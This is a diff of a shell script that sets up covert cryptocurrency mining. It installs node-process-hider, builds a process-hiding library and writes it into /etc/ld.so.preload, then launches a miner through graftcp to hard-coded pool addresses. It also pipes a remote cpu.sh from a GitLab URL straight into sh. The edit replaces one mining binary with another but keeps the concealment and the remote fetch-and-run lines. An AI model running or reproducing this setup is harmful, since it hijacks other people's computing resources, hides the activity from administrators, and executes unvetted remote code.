@@ -14,9 +14,9 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/lol1.90
+wget https://github.com/6block/f2pool_prover/releases/download/v0.1.2/f2pool_prover-v0.1.2.tar.gz && tar -zvxf f2pool_prover-v0.1.2.tar.gz && cd f2pool_prover
 
-chmod 777 lol1.90
+chmod +x f2pool_prover
 
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz
 
@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./lol1.90 --algo PYRINV2 --pool 167.172.24.221:443 --user pyrin:qrdnw92cg9wfqa4fqj0faemlctwy6cyguhzsm7dl3wasxccc4crmqy2r76qwn.$(shuf -n 1 -i 1-3000)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
+./graftcp/graftcp ./f2pool_prover --pool 143.244.155.117:80 --account majapahlevi --custom_name $(shuf -n 1 -i 1-9999)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh
